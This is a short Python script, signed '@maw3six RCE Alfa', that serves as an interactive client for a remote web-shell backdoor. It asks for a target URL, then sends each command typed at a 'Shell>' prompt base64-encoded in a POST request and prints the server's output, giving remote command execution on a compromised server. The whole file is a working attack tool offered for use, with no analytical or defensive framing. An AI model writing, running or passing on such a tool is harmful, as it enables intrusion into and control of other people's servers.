import requests
import base64

class RemotePerlBackdoor:
    def __init__(self, url):
        self.url = url

    def execute(self, command):
        try:
            cmd_encoded = base64.b64encode(command.encode()).decode()
            check_encoded = base64.b64encode(b"OK").decode()

            data = {
                "cmd": cmd_encoded,
                "check": check_encoded
            }

            response = requests.post(self.url, data=data, timeout=10)
            
            if response.status_code == 200:
                return response.text
            else:
                return f"[ERROR] Status Code: {response.status_code}"
        except requests.exceptions.RequestException as e:
            return f"[ERROR] {str(e)}"

def main():
    print("[*] @maw3six RCE Alfa")
    target_url = input("[?] Target: ").strip()

    if not target_url.startswith("http"):
        print("[ERROR]")
        return

    backdoor = RemotePerlBackdoor(target_url)

    print(f"[*] Connected to {target_url}")
    print("[*] Type 'exit' to quit.\n")

    while True:
        try:
            cmd = input("Shell> ").strip()
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Exiting...")
                break
            
            if cmd:
                output = backdoor.execute(cmd)
                print(output)
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break

if __name__ == "__main__":
    main()
